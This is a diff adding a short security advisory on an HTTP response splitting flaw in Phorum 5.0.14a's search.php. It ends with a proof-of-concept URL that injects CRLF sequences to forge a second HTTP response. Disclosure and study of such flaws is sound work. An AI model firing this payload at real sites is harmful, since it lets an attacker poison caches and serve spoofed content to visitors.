@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/12869/info
+
+A remote HTTP response splitting vulnerability reportedly affects Phorum. This issue is due to a failure of the application to properly sanitize user-supplied input.
+
+A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted.
+
+This issue was reported to affect Phorum version 5.0.14a; other versions might also be affected.
+
+http://www.example.com/phorum5/search.php?forum_id=0&search=1&body=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2
+034%0d%0a%0d%0a<html>Scanned by PTsecurity</html>%0d%0a&author=1&subject=1&match_forum=ALL&match_type=ALL&match_dates=30 
